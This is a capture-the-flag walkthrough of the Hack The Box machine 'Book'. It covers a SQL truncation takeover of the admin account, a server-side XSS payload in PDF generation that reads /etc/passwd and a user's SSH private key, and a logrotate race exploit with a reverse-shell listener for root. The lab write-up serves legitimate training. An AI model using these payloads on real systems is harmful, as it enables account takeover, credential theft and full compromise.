# Hack The Box: Book

**Difficulty:** Medium
**OS:** Linux

Book is a Medium-level Linux machine that focuses heavily on web application business logic flaws and server-side interactions. The initial foothold requires exploiting a SQL truncation vulnerability during user registration to gain administrative access to the web portal. From there, a Cross-Site Scripting (XSS) vulnerability in a PDF generation feature allows for local file inclusion (LFI) to extract SSH credentials. Privilege escalation involves exploiting a misconfigured `logrotate` service to gain root access.

---

## Reconnaissance

The assessment begins with a port scan to identify open services on the target machine.

```bash
nmap -p- --min-rate 10000 10.10.10.176
nmap -p 22,80 -sCV 10.10.10.176
```

The scan identifies two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.29)

Navigating to port 80 reveals a web application for a library or book repository. The site allows users to register, log in, browse books, and submit feedback. 

## Web Exploitation & Initial Access

### SQL Truncation (Logic Flaw)

We begin by creating a standard user account on the registration page and logging into the portal. The application allows users to upload books and submit messages to the administrator.

Directory enumeration with `gobuster` reveals an `/admin` directory, which redirects to an administrative login portal. Attempting default credentials or basic SQL injection bypasses fail.

However, the application allows us to register an account. We analyze the registration logic, specifically how the application handles long inputs. A SQL truncation vulnerability occurs when a database column has a strict character limit (e.g., 20 characters for a username). If an application accepts a username longer than the limit without validation, the database will truncate the trailing characters before saving it.

If the application already has an administrator account named `admin`, we can attempt to register an account with a payload designed to be truncated into `admin`:

```text
admin               a
```
*(The payload consists of the word 'admin', followed by enough spaces to hit the database column limit, followed by a trailing character to bypass application-level uniqueness checks).*

When the application saves this to the database, it truncates the payload to the maximum length, effectively creating a secondary record for `admin` but with a password we control.

We register this crafted username and set a known password. We can then successfully log into the `/admin` portal using the username `admin` and our newly set password.

### XSS to Local File Read via PDF Generation

Once authenticated as an administrator, we can view user submissions, including PDF reports or book uploads. The application features a function that generates PDF documents dynamically from user input (e.g., feedback or book descriptions) submitted by standard users.

Dynamic PDF generation libraries (such as `wkhtmltopdf` or similar tools) often interpret HTML and JavaScript. If user input is not properly sanitized before being passed to the PDF generator, it is vulnerable to Cross-Site Scripting (XSS). Because the PDF is generated on the server, this XSS executes in a server-side context, which can be abused to read local files.

We log back into our standard user account and submit a new book entry or feedback containing a malicious XSS payload designed to read local files using an `iframe` or `XMLHttpRequest`.

```html
<script>
  x = new XMLHttpRequest();
  x.onload = function() {
    document.write(this.responseText);
  };
  x.open("GET", "file:///etc/passwd");
  x.send();
</script>
```
*Alternatively, a simple iframe payload is often sufficient if JavaScript is disabled but HTML rendering is active:*
```html
<iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe>
```

We log into the `/admin` portal and generate the PDF containing our payload. Viewing the generated PDF reveals the contents of the `/etc/passwd` file embedded within the document.

Reviewing `/etc/passwd` reveals a user named `reader`. We modify our XSS payload to read `reader`'s SSH private key:

```html
<iframe src="file:///home/reader/.ssh/id_rsa" width="100%" height="1000px"></iframe>
```

After submitting the updated payload and regenerating the PDF, the document contains the SSH private key. We extract the key and use it to authenticate as the user `reader`.

```bash
chmod 600 reader_id_rsa
ssh -i reader_id_rsa reader@10.10.10.176
```
We retrieve the `user.txt` flag.

## Privilege Escalation

Enumerating the system as the user `reader`, we monitor running processes and check for scheduled tasks. Running a tool like `pspy` reveals a background process executing on a recurring schedule.

```bash
./pspy64
# Output shows logrotate running periodically as root
```

The system is configured to run `logrotate` as `root` to manage log files located in a directory where the `reader` user has write access (e.g., related to the web application logs or a custom backup directory).

### Exploiting logrotate (logrotten)

Older versions of `logrotate` are vulnerable to race conditions when rotating log files in directories where an unprivileged user has write access. If the user can rename or replace files during the rotation process, they can trick `logrotate` into operating on arbitrary files, or force it to execute custom scripts.

This vulnerability can be exploited using tools like `logrotten` or custom C scripts designed to win the race condition.

We create a malicious payload to spawn a reverse shell or copy the root flag, and compile the exploit on the target machine.

```c
// Compile exploit
gcc -o logrotten logrotten.c
```

We execute the exploit, targeting the specific log file managed by `logrotate`.

```bash
./logrotten -p /path/to/payload /home/reader/logs/access.log
```

We must then trigger a log rotation event. If we cannot wait for the cron job, we can sometimes force a rotation by writing a large amount of data to the log file to exceed the rotation threshold.

```bash
head -c 100M /dev/urandom >> /home/reader/logs/access.log
```

When `logrotate` executes as root and attempts to rotate the file, the race condition is won, and our malicious payload executes with root privileges.

```bash
# Payload executes reverse shell to our listener
nc -lnvp 443
# Connection received
id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
